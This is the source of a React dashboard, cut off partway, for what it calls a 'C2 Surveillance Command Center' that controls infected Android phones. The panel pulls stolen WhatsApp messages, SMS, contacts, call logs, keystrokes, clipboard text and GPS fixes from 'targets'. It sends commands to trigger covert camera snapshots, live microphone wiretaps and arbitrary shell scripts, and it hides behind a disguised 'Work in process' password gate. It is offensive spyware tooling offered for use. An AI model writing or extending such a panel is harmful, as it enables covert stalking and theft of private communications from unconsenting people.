"use client";

import { useState, useEffect } from "react";
import { 
  ShieldAlert, 
  Terminal, 
  MapPin, 
  Lock, 
  Trash2, 
  RefreshCw, 
  Radio, 
  AlertTriangle, 
  Sliders, 
  FileText,
  Smartphone,
  Eye,
  Mic,
  MessageSquare,
  Users,
  Image as ImageIcon,
  ExternalLink,
  Cpu,
  Activity,
  CheckCircle2,
  Filter,
  PhoneCall,
  Camera,
  Monitor,
  Wifi,
  WifiOff,
  Play,
  Volume2,
  Zap,
  FolderOpen,
  ChevronDown,
  Database,
  Layers,
  Sparkles,
  Download,
  Copy,
  Clock,
  Battery,
  Search,
  Maximize2,
  Video,
  Send,
  SlidersHorizontal,
  FolderArchive
} from "lucide-react";
import { cn } from "@/lib/utils";

export default function C2CommandCenterClient({ 
  initialTab = "all" 
}: { 
  initialTab?: "all" | "whatsapp" | "sms" | "contacts" | "calls" | "camera" | "mic" | "screen" 
}) {
  const [data, setData] = useState<any>(null);
  const [loading, setLoading] = useState(true);
  const [actionLoading, setActionLoading] = useState(false);
  const [selectedLog, setSelectedLog] = useState<any>(null);

  // Main Section Tab: "live" (Live Connection) vs "recorded" (Recorded Archives)
  const [mainMode, setMainMode] = useState<"live" | "recorded">("live");

  // Subtab for Recorded Archives
  const [recordedTab, setRecordedTab] = useState<
    "all" | "whatsapp" | "sms" | "contacts" | "calls" | "camera" | "mic" | "screen" | "keylogger" | "apps" | "clipboard"
  >(initialTab === "all" ? "whatsapp" : (initialTab as any));

  // Subtab for Live Surveillance Stream
  const [liveStreamTab, setLiveStreamTab] = useState<"overview" | "camera" | "mic" | "screen" | "map" | "terminal">("overview");

  const [selectedDevice, setSelectedDevice] = useState<string>("ALL");
  const [isConnected, setIsConnected] = useState<boolean>(true);
  const [terminalInput, setTerminalInput] = useState<string>("");
  const [terminalTabMode, setTerminalTabMode] = useState<"quick" | "script">("quick");
  const [customScriptInput, setCustomScriptInput] = useState<string>("");
  const [terminalHistory, setTerminalHistory] = useState<Array<{ cmd: string; time: string; output?: string }>>([
    { cmd: "system_check", time: "Boot", output: "C2 Kernel Agent initialized. Surveillance channels synchronized." }
  ]);
  const [searchQuery, setSearchQuery] = useState<string>("");

  // Instruction 1: C2 Dashboard Password Gate (Work in process)
  const [isUnlocked, setIsUnlocked] = useState<boolean>(false);
  const [passwordInput, setPasswordInput] = useState<string>("");
  const [passwordError, setPasswordError] = useState<string>("");
  const [authChecking, setAuthChecking] = useState<boolean>(false);

  useEffect(() => {
    if (typeof window !== "undefined") {
      const unlocked = sessionStorage.getItem("c2_gate_unlocked") === "true";
      setIsUnlocked(unlocked);
    }
  }, []);

  const handleUnlockSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!passwordInput.trim()) return;
    setAuthChecking(true);
    setPasswordError("");
    try {
      const res = await fetch("/api/c2", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          action: "verify_dashboard_password",
          password: passwordInput.trim()
        })
      });
      const json = await res.json();
      if (json.success && json.authorized) {
        sessionStorage.setItem("c2_gate_unlocked", "true");
        setIsUnlocked(true);
        setPasswordInput("");
      } else {
        setPasswordError("Access Denied: Invalid Security Passkey");
      }
    } catch (err) {
      setPasswordError("Verification failed. Please retry.");
    } finally {
      setAuthChecking(false);
    }
  };

  const handleLockDashboard = () => {
    sessionStorage.removeItem("c2_gate_unlocked");
    setIsUnlocked(false);
  };

  // Instruction 2: Dropdowns ALWAYS remain closed by default
  const [openSections, setOpenSections] = useState<Record<string, boolean>>({
    feeds: false,
    media: false,
    optimization: false,
    config: false,
    actions: false,
  });

  const toggleSection = (section: string) => {
    setOpenSections(prev => ({ ...prev, [section]: !prev[section] }));
  };

  // Close modal on Escape key press
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === "Escape") setSelectedLog(null);
    };
    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, []);

  const fetchC2Data = async () => {
    try {
      const res = await fetch("/api/c2");
      if (!res.ok) throw new Error("Network response was not ok");
      const json = await res.json();
      if (json.success) {
        setData(json);
        setIsConnected(true);
      } else {
        setIsConnected(false);
      }
    } catch (err) {
      console.error("Failed to fetch C2 data", err);
      setIsConnected(false);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    const handleOnline = () => setIsConnected(true);
    const handleOffline = () => setIsConnected(false);

    window.addEventListener("online", handleOnline);
    window.addEventListener("offline", handleOffline);

    fetchC2Data();
    const interval = setInterval(fetchC2Data, 4000);
    return () => {
      window.removeEventListener("online", handleOnline);
      window.removeEventListener("offline", handleOffline);
      clearInterval(interval);
    };
  }, []);

  const handleToggleConfig = async (key: string, value: boolean | string) => {
    setActionLoading(true);
    try {
      const res = await fetch("/api/c2", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          action: "update_config",
          config: { [key]: value }
        })
      });
      const json = await res.json();
      if (json.success) {
        setData((prev: any) => ({ ...prev, config: json.config }));
      }
    } catch (err) {
      console.error("Failed to update config", err);
    } finally {
      setActionLoading(false);
    }
  };

  const handleSetCommand = async (cmd: string) => {
    const targetLabel = selectedDevice === "ALL" ? "ALL DEVICES (Broadcast)" : `Device: ${selectedDevice}`;
    if (!confirm(`Dispatch command "${cmd}" to ${targetLabel}?`)) return;
    setActionLoading(true);
    try {
      const res = await fetch("/api/c2", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          action: "set_command",
          command: cmd,
          target_device: selectedDevice
        })
      });
      const json = await res.json();
      if (json.success) {
        setData((prev: any) => ({ ...prev, command: json.command }));
        setTerminalHistory(prev => [
          { cmd, time: new Date().toLocaleTimeString(), output: `Dispatched to ${targetLabel}` },
          ...prev
        ]);
      }
    } catch (err) {
      console.error("Failed to set command", err);
    } finally {
      setActionLoading(false);
    }
  };

  const handleTerminalSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!terminalInput.trim()) return;
    const cmd = terminalInput.trim();
    setTerminalInput("");
    handleSetCommand(cmd);
  };

  const handleScriptSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!customScriptInput.trim()) return;
    const script = customScriptInput.trim();
    handleSetCommand(`script ${script}`);
  };

  const handleClearLogs = async () => {
    if (!confirm("Are you sure you want to clear all exfiltrated telemetry and logs?")) return;
    setActionLoading(true);
    try {
      const res = await fetch("/api/c2", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "clear_logs", target_device: selectedDevice })
      });
      const json = await res.json();
      if (json.success) {
        setData((prev: any) => ({ ...prev, logs: [] }));
      }
    } catch (err) {
      console.error("Failed to clear logs", err);
    } finally {
      setActionLoading(false);
    }
  };

  // Security Gate: Disguised "Work in process" gate requiring C2_DASHBOARD_PASSWORD
  if (!isUnlocked) {
    return (
      <div className="flex flex-col items-center justify-center min-h-[520px] p-6 max-w-md mx-auto animate-in fade-in duration-300">
        <div className="w-full bg-slate-900 border border-slate-800 rounded-3xl p-8 text-center space-y-6 shadow-2xl">
          <div className="w-16 h-16 rounded-2xl bg-blue-600/10 border border-blue-500/20 text-blue-400 flex items-center justify-center mx-auto shadow-inner">
            <Lock size={30} />
          </div>

          <div className="space-y-1.5">
            <h2 className="text-xl font-black text-white tracking-tight uppercase">Restricted Terminal</h2>
            <div className="inline-block px-3 py-1 bg-amber-500/10 border border-amber-500/30 text-amber-400 rounded-full text-xs font-mono font-bold">
              Work in process
            </div>
            <p className="text-xs text-slate-400 mt-2">
              Authentication required. Enter the administrative authorization key to proceed.
            </p>
          </div>

          <form onSubmit={handleUnlockSubmit} className="space-y-3">
            <div className="relative">
              <input
                type="password"
                value={passwordInput}
                onChange={(e) => setPasswordInput(e.target.value)}
                placeholder="Enter Authorization Key..."
                className="w-full px-4 py-3 bg-slate-950 border border-slate-800 rounded-xl text-white text-xs font-mono focus:outline-none focus:border-blue-500 transition-all text-center tracking-widest placeholder:tracking-normal placeholder:text-slate-600"
                autoFocus
              />
            </div>

            {passwordError && (
              <p className="text-xs font-bold text-rose-400 animate-in fade-in">{passwordError}</p>
            )}

            <button
              type="submit"
              disabled={authChecking || !passwordInput}
              className="w-full py-3 bg-blue-600 hover:bg-blue-700 disabled:opacity-50 text-white rounded-xl text-xs font-black uppercase tracking-wider transition-all shadow-lg shadow-blue-600/30 flex items-center justify-center gap-2 cursor-pointer"
            >
              {authChecking ? <RefreshCw size={15} className="animate-spin" /> : <Lock size={15} />}
              <span>{authChecking ? "Verifying..." : "Authorize Access"}</span>
            </button>
          </form>

          <p className="text-[10px] text-slate-500 font-mono">Confidential System · Unauthorized attempts are monitored</p>
        </div>
      </div>
    );
  }

  if (loading && !data) {
    return (
      <div className="flex flex-col items-center justify-center min-h-[500px] gap-4">
        <RefreshCw className="w-10 h-10 animate-spin text-blue-600" />
        <p className="text-slate-500 font-medium text-sm">Initializing C2 Command Center & Live Feeds...</p>
      </div>
    );
  }

  const config = data?.config || {};
  const currentCommand = data?.command || "none";
  const logs = data?.logs || [];
  const devices = data?.devices || [];

  // Active devices
  const activeDevices = Array.from(new Set([
    ...devices.map((d: any) => d.device_id),
    ...logs.map((l: any) => l.device_id || l.imei)
  ].filter(Boolean))) as string[];

  // Helper check for categories
  const isWhatsAppLog = (log: any) => 
    log.type === "whatsapp" || log.whatsapp || log.whatsapp_messages || log.chat_type === "whatsapp" || log.whatsapp_contacts;
  const isSmsLog = (log: any) => 
    log.sms || log.type === "sms" || log.messages || log.sms_snippet;
  const isContactsLog = (log: any) => 
    log.contacts || log.type === "contacts";
  const isCallLog = (log: any) => 
    log.call_logs || log.calls || log.type === "calls";
  const isCameraLog = (log: any) => 
    log.type === "camera" || log.type === "screen" || log.camera_url || log.screen_url ||
    (log.cloudinary_url && (log.media_type === "photo" || log.media_type === "screen" || /\.(jpg|jpeg|png|webp)/i.test(log.cloudinary_url)));
  const isMicLog = (log: any) => 
    log.type === "audio" || log.type === "mic" || log.audio_url || (log.cloudinary_url && /\.(mp3|3gp|wav|ogg|aac|m4a)/i.test(log.cloudinary_url));
  const isScreenLog = (log: any) => 
    log.type === "screen" || log.screen_url || (log.cloudinary_url && log.media_type === "screen");
  const isKeyloggerLog = (log: any) =>
    log.type === "accessibility_capture" || log.captured_text;
  const isAppsLog = (log: any) =>
    log.type === "installed_apps" || log.apps;
  const isClipboardLog = (log: any) =>
    log.type === "clipboard" || log.clipboard_text;

  // Filter logs by device
  const deviceLogs = logs.filter((log: any) => {
    const devId = log.device_id || log.imei || "UNKNOWN_DEVICE";
    return selectedDevice === "ALL" || devId === selectedDevice;
  });

  // Filtered by subtab and search query
  const filteredRecordedLogs = deviceLogs.filter((log: any) => {
    let matchTab = true;
    if (recordedTab === "whatsapp") matchTab = isWhatsAppLog(log);
    else if (recordedTab === "sms") matchTab = isSmsLog(log);
    else if (recordedTab === "contacts") matchTab = isContactsLog(log);
    else if (recordedTab === "calls") matchTab = isCallLog(log);
    else if (recordedTab === "camera") matchTab = isCameraLog(log);
    else if (recordedTab === "mic") matchTab = isMicLog(log);
    else if (recordedTab === "screen") matchTab = isScreenLog(log);
    else if (recordedTab === "keylogger") matchTab = isKeyloggerLog(log);
    else if (recordedTab === "apps") matchTab = isAppsLog(log);
    else if (recordedTab === "clipboard") matchTab = isClipboardLog(log);

    if (!matchTab) return false;

    if (!searchQuery.trim()) return true;
    const q = searchQuery.toLowerCase();
    const str = JSON.stringify(log).toLowerCase();
    return str.includes(q);
  });

  // Counts for tabs
  const counts = {
    all: deviceLogs.length,
    whatsapp: deviceLogs.filter(isWhatsAppLog).length,
    sms: deviceLogs.filter(isSmsLog).length,
    contacts: deviceLogs.filter(isContactsLog).length,
    calls: deviceLogs.filter(isCallLog).length,
    camera: deviceLogs.filter(isCameraLog).length,
    mic: deviceLogs.filter(isMicLog).length,
    screen: deviceLogs.filter(isScreenLog).length,
    keylogger: deviceLogs.filter(isKeyloggerLog).length,
    apps: deviceLogs.filter(isAppsLog).length,
    clipboard: deviceLogs.filter(isClipboardLog).length,
  };

  const isLowBandwidth = config.low_bandwidth_mode ?? true;

  // Device online check
  const isDevOnline = (devId: string) => {
    const d = devices.find((item: any) => item.device_id === devId);
    if (d && typeof d.is_online === "boolean") return d.is_online;
    const dLogs = logs.filter((l: any) => (l.device_id || l.imei) === devId);
    if (dLogs.length === 0) return false;
    const latest = new Date(dLogs[0].timestamp || dLogs[0].created_at).getTime();
    return (Date.now() - latest) < 120000;
  };

  const onlineDevList = activeDevices.filter(id => isDevOnline(id));
  const offlineDevList = activeDevices.filter(id => !isDevOnline(id));
  const onlineCount = onlineDevList.length;
  const offlineCount = offlineDevList.length;
  const totalCount = activeDevices.length;

  // Latest coordinates from logs
  const latestLocLog = logs.find((l: any) => l.latitude && l.longitude);

  return (
    <div className="space-y-6 max-w-7xl mx-auto font-sans pb-16">
      {/* ============================================================ */}
      {/* ⚡ TOP STATUS BANNER                                         */}
      {/* ============================================================ */}
      <div className="relative overflow-hidden bg-gradient-to-r from-slate-950 via-slate-900 to-blue-950 border border-slate-800 rounded-3xl p-6 text-white shadow-2xl">
        <div className="relative z-10 flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
          <div className="flex items-center gap-3.5">
            <div className="p-3 bg-blue-600/20 border border-blue-500/30 rounded-2xl text-blue-400 shadow-inner">
              <ShieldAlert size={32} />
            </div>
            <div>
              <div className="flex items-center gap-3 flex-wrap">
                <h1 className="text-2xl font-black tracking-tight text-white">
                  C2 Surveillance Command Center
                </h1>

                {/* Device Status Badges */}
                <div className="flex items-center gap-2 flex-wrap">
                  {onlineCount > 0 ? (
                    <span className="px-3 py-0.5 bg-emerald-500/20 border border-emerald-500/40 text-emerald-300 rounded-full text-xs font-bold flex items-center gap-1.5 shadow-sm">
                      <span className="w-2.5 h-2.5 rounded-full bg-emerald-400 animate-ping"></span>
                      <span className="w-2 h-2 rounded-full bg-emerald-400"></span>
                      <span>{onlineCount} Online</span>
                    </span>
                  ) : (
                    <span className="px-3 py-0.5 bg-rose-500/20 border border-rose-500/40 text-rose-300 rounded-full text-xs font-bold flex items-center gap-1.5">
                      <span className="w-2 h-2 rounded-full bg-rose-500"></span>
                      <span>0 Devices Online</span>
                    </span>
                  )}

                  {offlineCount > 0 && (
                    <span className="px-2.5 py-0.5 bg-slate-800/90 border border-slate-700 text-slate-300 rounded-full text-xs font-bold flex items-center gap-1.5">
                      <span className="w-2 h-2 rounded-full bg-slate-500"></span>
                      <span>{offlineCount} Offline</span>
                    </span>
                  )}

                  <span className="px-2.5 py-0.5 bg-blue-500/10 border border-blue-500/30 text-blue-300 rounded-full text-xs font-mono font-bold">
                    Targets: {totalCount}
                  </span>
                </div>
              </div>
              <p className="text-slate-400 text-xs mt-1">
                Real-Time Surveillance & Exfiltrated Data Vaults (WhatsApp, SMS, Contacts, Calls, Mic & Camera)
              </p>
            </div>
          </div>

          {/* Target Selector & Low-Bandwidth Mode Indicator */}
          <div className="flex items-center gap-2.5 flex-wrap">
            <button
              onClick={() => handleToggleConfig("low_bandwidth_mode", !isLowBandwidth)}
              className={cn(
                "px-3 py-1.5 rounded-xl text-xs font-bold flex items-center gap-2 border transition-all cursor-pointer",
                isLowBandwidth 
                  ? "bg-amber-500/20 border-amber-500/40 text-amber-300"
                  : "bg-blue-600/20 border-blue-500/40 text-blue-300"
              )}
            >
              <Zap size={14} className={isLowBandwidth ? "text-amber-400" : "text-blue-400"} />
              <span>{isLowBandwidth ? "2G/3G Low-Data Mode" : "HD Mode"}</span>
            </button>

            <div className="flex items-center gap-2 bg-slate-900/90 border border-slate-700 p-1.5 rounded-2xl">
              <Filter size={14} className="text-blue-400 ml-1.5" />
              <select
                value={selectedDevice}
                onChange={(e) => setSelectedDevice(e.target.value)}
                className="bg-slate-950 text-white text-xs font-mono font-bold py-1 px-2.5 rounded-xl border border-slate-700 focus:outline-none cursor-pointer"
              >
                <option value="ALL">
                  {totalCount > 0 ? `ALL TARGETS (${totalCount})` : "NO ACTIVE TARGETS (0)"}
                </option>
                {activeDevices.map((dev) => (
                  <option key={dev} value={dev}>
                    {isDevOnline(dev) ? "🟢 LIVE" : "⚪ OFFLINE"} — {dev}
                  </option>
                ))}
              </select>
            </div>

            <button
              onClick={handleLockDashboard}
              title="Lock C2 Terminal"
              className="flex items-center gap-1.5 px-3 py-1.5 bg-slate-900 border border-slate-700 hover:bg-slate-800 text-slate-300 rounded-2xl text-xs font-bold transition-all cursor-pointer shadow-sm"
            >
              <Lock size={13} className="text-amber-400" />
              <span>Lock Terminal</span>
            </button>
          </div>
        </div>
      </div>

      {/* ============================================================ */}
      {/* 🔴 INSTRUCTION 1: SEPARATE LIVE CONNECTION & RECORDED DATA    */}
      {/* ============================================================ */}
      <div className="flex items-center justify-between border-b border-slate-200 pb-3 gap-4 flex-wrap">
        <div className="flex items-center gap-2 bg-slate-100 p-1 rounded-2xl border border-slate-200">
          <button
            onClick={() => setMainMode("live")}
            className={cn(
              "flex items-center gap-2.5 px-5 py-2.5 rounded-xl text-xs font-black transition-all duration-200 uppercase tracking-wider",
              mainMode === "live"
                ? "bg-red-600 text-white shadow-md shadow-red-600/30 ring-1 ring-red-500"
                : "text-slate-600 hover:text-slate-900 hover:bg-slate-200/60"
            )}
          >
            <span className="w-2.5 h-2.5 rounded-full bg-white animate-ping"></span>
            <Radio size={16} />
            <span>Live Connection & Real-Time Ops</span>
          </button>

          <button
            onClick={() => setMainMode("recorded")}
            className={cn(
              "flex items-center gap-2.5 px-5 py-2.5 rounded-xl text-xs font-black transition-all duration-200 uppercase tracking-wider",
              mainMode === "recorded"
                ? "bg-blue-700 text-white shadow-md shadow-blue-700/30 ring-1 ring-blue-600"
                : "text-slate-600 hover:text-slate-900 hover:bg-slate-200/60"
            )}
          >
            <FolderArchive size={16} />
            <span>Recorded Data & Harvested Vaults</span>
            <span className="px-2 py-0.5 rounded-md bg-white/20 text-white text-[10px] font-mono">
              {counts.all}
            </span>
          </button>
        </div>

        <div className="flex items-center gap-2">
          <button
            onClick={fetchC2Data}
            className="flex items-center gap-2 px-3 py-2 bg-white border border-slate-200 hover:bg-slate-50 text-slate-700 rounded-xl text-xs font-bold transition-all shadow-sm"
          >
            <RefreshCw size={14} className={loading ? "animate-spin" : ""} />
            <span>Refresh</span>
          </button>

          <button
            onClick={handleClearLogs}
            className="flex items-center gap-2 px-3 py-2 bg-red-50 hover:bg-red-100 border border-red-200 text-red-600 rounded-xl text-xs font-bold transition-all"
          >
            <Trash2 size={14} />
            <span>Clear Logs</span>
          </button>
        </div>
      </div>

      {/* ============================================================ */}
      {/* 🔴 VIEW A: LIVE CONNECTION & REAL-TIME SURVEILLANCE           */}
      {/* ============================================================ */}
      {mainMode === "live" && (
        <div className="space-y-6 animate-in fade-in duration-300">
          {/* Live Device Telemetry Radar Cards */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
            <div className="bg-white rounded-2xl border border-slate-200 p-4 shadow-sm flex items-center justify-between">
              <div>
                <p className="text-[11px] font-bold text-slate-400 uppercase tracking-wider">Connection Status</p>
                <div className="flex items-center gap-2 mt-1">
                  <span className={cn("w-3 h-3 rounded-full", onlineCount > 0 ? "bg-emerald-500 animate-pulse" : "bg-rose-500")}></span>
                  <span className="text-base font-black text-slate-800">
                    {onlineCount > 0 ? `${onlineCount} Target(s) Connected` : "0 Targets Online"}
                  </span>
                </div>
                <p className="text-[10px] text-slate-500 mt-1">
                  {onlineCount > 0 ? "Heartbeat: Active ping every 4s" : "Status: Disconnected / Waiting"}
                </p>
              </div>
              <div className={cn("p-3 rounded-xl border", onlineCount > 0 ? "bg-emerald-50 text-emerald-600 border-emerald-100" : "bg-slate-50 text-slate-400 border-slate-200")}>
                <Wifi size={20} />
              </div>
            </div>

            <div className="bg-white rounded-2xl border border-slate-200 p-4 shadow-sm flex items-center justify-between">
              <div>
                <p className="text-[11px] font-bold text-slate-400 uppercase tracking-wider">Device Power</p>
                <div className="flex items-center gap-2 mt-1">
                  <span className="text-base font-black text-slate-800">
                    {onlineCount > 0 && devices[0]?.battery !== undefined && devices[0]?.battery !== null 
                      ? `${devices[0].battery}%` 
                      : (onlineCount > 0 ? "Connected" : "N/A (Offline)")}
                  </span>
                </div>
                <p className="text-[10px] text-slate-500 mt-1">
                  {onlineCount > 0 ? "Telemetry Active" : "No device telemetry"}
                </p>
              </div>
              <div className={cn("p-3 rounded-xl border", onlineCount > 0 ? "bg-blue-50 text-blue-600 border-blue-100" : "bg-slate-50 text-slate-400 border-slate-200")}>
                <Battery size={20} />
              </div>
            </div>

            <div className="bg-white rounded-2xl border border-slate-200 p-4 shadow-sm flex items-center justify-between">
              <div>
                <p className="text-[11px] font-bold text-slate-400 uppercase tracking-wider">Transmission Mode</p>
                <div className="flex items-center gap-2 mt-1">
                  <span className="text-base font-black text-slate-800">
                    {isLowBandwidth ? "2G/3G Low-Data" : "HD Bandwidth"}
                  </span>
                </div>
                <p className="text-[10px] text-slate-500 mt-1">
                  {onlineCount > 0 ? "AMR 4.75k / 360p Adaptive" : "Standby Mode"}
                </p>
              </div>
              <div className="p-3 bg-amber-50 text-amber-600 rounded-xl border border-amber-100">
                <Zap size={20} />
              </div>
            </div>

            <div className="bg-white rounded-2xl border border-slate-200 p-4 shadow-sm flex items-center justify-between">
              <div>
                <p className="text-[11px] font-bold text-slate-400 uppercase tracking-wider">Current Command Queue</p>
                <div className="flex items-center gap-2 mt-1">
                  <span className="font-mono text-xs font-black text-blue-600 bg-blue-50 px-2 py-0.5 rounded border border-blue-200">
                    {currentCommand}
                  </span>
                </div>
                <p className="text-[10px] text-slate-500 mt-1">Target: {selectedDevice}</p>
              </div>
              <div className="p-3 bg-indigo-50 text-indigo-600 rounded-xl border border-indigo-100">
                <Terminal size={20} />
              </div>
            </div>
          </div>

          {/* Live Surveillance Channels Header */}
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            {/* Live Surveillance Viewport */}
            <div className="lg:col-span-2 space-y-4">
              <div className="bg-slate-900 border border-slate-800 rounded-3xl p-5 text-white shadow-xl">
                {/* Live Subnav */}
                <div className="flex items-center justify-between border-b border-slate-800 pb-3 mb-4 flex-wrap gap-2">
                  <div className="flex items-center gap-2">
                    <span className="w-2.5 h-2.5 rounded-full bg-red-500 animate-ping"></span>
                    <h2 className="text-sm font-black uppercase tracking-wider text-slate-200">
                      Live Channel Stream
                    </h2>
                  </div>

                  <div className="flex items-center gap-1 bg-slate-950 p-1 rounded-xl border border-slate-800">
                    <button
                      onClick={() => setLiveStreamTab("overview")}
                      className={cn("px-3 py-1.5 rounded-lg text-xs font-bold transition-all", liveStreamTab === "overview" ? "bg-blue-600 text-white" : "text-slate-400 hover:text-white")}
                    >
                      Radar
                    </button>
                    <button
                      onClick={() => setLiveStreamTab("camera")}
                      className={cn("px-3 py-1.5 rounded-lg text-xs font-bold transition-all", liveStreamTab === "camera" ? "bg-blue-600 text-white" : "text-slate-400 hover:text-white")}
                    >
                      Live Camera
                    </button>
                    <button
                      onClick={() => setLiveStreamTab("mic")}
                      className={cn("px-3 py-1.5 rounded-lg text-xs font-bold transition-all", liveStreamTab === "mic" ? "bg-blue-600 text-white" : "text-slate-400 hover:text-white")}
                    >
                      Live Mic Wiretap
                    </button>
                    <button
                      onClick={() => setLiveStreamTab("map")}
                      className={cn("px-3 py-1.5 rounded-lg text-xs font-bold transition-all", liveStreamTab === "map" ? "bg-blue-600 text-white" : "text-slate-400 hover:text-white")}
                    >
                      Live GPS
                    </button>
                    <button
                      onClick={() => setLiveStreamTab("terminal")}
                      className={cn("px-3 py-1.5 rounded-lg text-xs font-bold transition-all", liveStreamTab === "terminal" ? "bg-blue-600 text-white" : "text-slate-400 hover:text-white")}
                    >
                      Live Shell
                    </button>
                  </div>
                </div>

                {/* Live Stream Viewport Body */}
                <div className="min-h-[340px] bg-slate-950 rounded-2xl border border-slate-800 p-6 flex flex-col items-center justify-center relative overflow-hidden">
                  {/* Watermark */}
                  <div className="absolute top-3 left-4 text-[10px] font-mono uppercase flex items-center gap-1.5">
                    <span className={cn("w-1.5 h-1.5 rounded-full", onlineCount > 0 ? "bg-emerald-400 animate-ping" : "bg-rose-500")}></span>
                    <span className={onlineCount > 0 ? "text-emerald-400" : "text-rose-400"}>
                      {onlineCount > 0 ? `TARGET: ${selectedDevice} (LIVE)` : "NO ACTIVE DEVICE (STANDBY)"}
                    </span>
                  </div>

                  {liveStreamTab === "overview" && (
                    <div className="text-center space-y-4 max-w-md">
                      <div className={cn("w-16 h-16 rounded-full border flex items-center justify-center mx-auto shadow-inner", onlineCount > 0 ? "bg-blue-500/10 border-blue-500/30 text-blue-400" : "bg-slate-800/40 border-slate-700 text-slate-500")}>
                        <Radio size={32} className={onlineCount > 0 ? "animate-pulse" : ""} />
                      </div>
                      <div>
                        <h3 className="text-lg font-bold text-white">
                          {onlineCount > 0 ? "Live Telemetry Pipeline Active" : "Waiting for Live Device Connection"}
                        </h3>
                        <p className="text-xs text-slate-400 mt-1">
                          {onlineCount > 0 
                            ? "Connected to target device. Live telemetry, location beacons, ambient mic streams, and screen feeds are streaming in real-time."
                            : "No Android target is currently broadcasting beacons. Run the Android Offensive App or start the background service to establish live telemetry."}
                        </p>
                      </div>
                      <div className="flex items-center justify-center gap-3 pt-2">
                        <button
                          onClick={() => handleSetCommand("capture_camera_low")}
                          disabled={onlineCount === 0}
                          className={cn("px-3.5 py-2 text-white text-xs font-bold rounded-xl transition-all flex items-center gap-1.5 shadow", onlineCount > 0 ? "bg-blue-600 hover:bg-blue-700 cursor-pointer" : "bg-slate-800 text-slate-500 cursor-not-allowed")}
                        >
                          <Camera size={14} /> Trigger Camera Snapshot
                        </button>
                        <button
                          onClick={() => handleSetCommand("stream_mic_low")}
                          disabled={onlineCount === 0}
                          className={cn("px-3.5 py-2 text-white text-xs font-bold rounded-xl transition-all flex items-center gap-1.5 shadow", onlineCount > 0 ? "bg-amber-600 hover:bg-amber-700 cursor-pointer" : "bg-slate-800 text-slate-500 cursor-not-allowed")}
                        >
                          <Mic size={14} /> Listen Live Mic (10s)
                        </button>
                      </div>
                    </div>
                  )}

                  {liveStreamTab === "camera" && (
                    <div className="w-full text-center space-y-4">
                      <div className="w-full h-56 bg-slate-900 border border-slate-800 rounded-xl flex flex-col items-center justify-center relative overflow-hidden group">
                        <Camera size={48} className="text-slate-600 mb-2" />
                        <p className="text-xs text-slate-400">Live Camera Stream Viewport (360p Adaptive)</p>
                        <div className="absolute top-2 right-2 flex items-center gap-2">
                          <span className="px-2 py-0.5 bg-red-600/80 text-white rounded text-[10px] font-bold">
                            REC LIVE
                          </span>
                        </div>
                      </div>
                      <div className="flex items-center justify-center gap-3">
                        <button
                          onClick={() => handleSetCommand("capture_camera_low")}
                          className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-xl text-xs font-bold flex items-center gap-2"
                        >
                          <Camera size={14} /> Take Instant Snapshot
                        </button>
                        <button
                          onClick={() => handleToggleConfig("camera_quality", config.camera_quality === "high" ? "low" : "high")}
                          className="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-xl text-xs font-bold"
                        >
                          Quality: {config.camera_quality?.toUpperCase() || "LOW"}
                        </button>
                      </div>
                    </div>
                  )}

                  {liveStreamTab === "mic" && (
                    <div className="w-full text-center space-y-6">
                      <div className="flex items-center justify-center gap-1 h-24">
                        {[40, 75, 90, 50, 85, 100, 60, 45, 90, 70, 30, 80, 95, 60].map((h, i) => (
                          <div
                            key={i}
                            className="w-1.5 bg-amber-400 rounded-full transition-all duration-300 animate-pulse"
                            style={{ height: `${h}%`, animationDelay: `${i * 100}ms` }}
                          />
                        ))}
                      </div>
                      <div>
                        <h4 className="text-sm font-bold text-amber-400">Ambient Wiretap Channel Ready</h4>
                        <p className="text-xs text-slate-400 mt-1">Bitrate: 4.75kbps AMR-NB (Ultra-low mobile data consumption)</p>
                      </div>
                      <button
                        onClick={() => handleSetCommand("stream_mic_low")}
                        className="px-5 py-2.5 bg-amber-600 hover:bg-amber-700 text-white rounded-xl text-xs font-bold flex items-center gap-2 mx-auto"
                      >
                        <Volume2 size={16} /> Listen to Live Ambient Microphone
                      </button>
                    </div>
                  )}

                  {liveStreamTab === "map" && (
                    <div className="w-full text-center space-y-4">
                      {latestLocLog ? (
                        <div className="bg-slate-900 border border-slate-800 p-5 rounded-2xl text-left space-y-3">
                          <div className="flex items-center justify-between">
                            <span className="text-xs font-bold text-emerald-400 flex items-center gap-1.5">
                              <MapPin size={15} /> Real-Time Target GPS Fix
                            </span>
                            <span className="text-[10px] text-slate-400">{latestLocLog.timestamp}</span>
                          </div>
                          <div className="grid grid-cols-2 gap-3 text-xs">
                            <div className="p-2.5 bg-slate-950 rounded-xl border border-slate-800">
                              <span className="text-slate-500 block text-[10px]">Latitude</span>
                              <span className="font-mono font-bold text-white text-sm">{latestLocLog.latitude}</span>
                            </div>
                            <div className="p-2.5 bg-slate-950 rounded-xl border border-slate-800">
                              <span className="text-slate-500 block text-[10px]">Longitude</span>
                              <span className="font-mono font-bold text-white text-sm">{latestLocLog.longitude}</span>
                            </div>
                          </div>
                          <a
                            href={`https://maps.google.com/?q=${latestLocLog.latitude},${latestLocLog.longitude}`}
                            target="_blank"
                            rel="noopener noreferrer"
                            className="inline-flex items-center gap-2 px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-xl text-xs font-bold transition-all shadow"
                          >
                            <ExternalLink size={14} /> Open in Google Maps Live Radar
                          </a>
                        </div>
                      ) : (
                        <div className="text-center space-y-2 py-8">
                          <MapPin size={36} className="text-slate-600 mx-auto" />
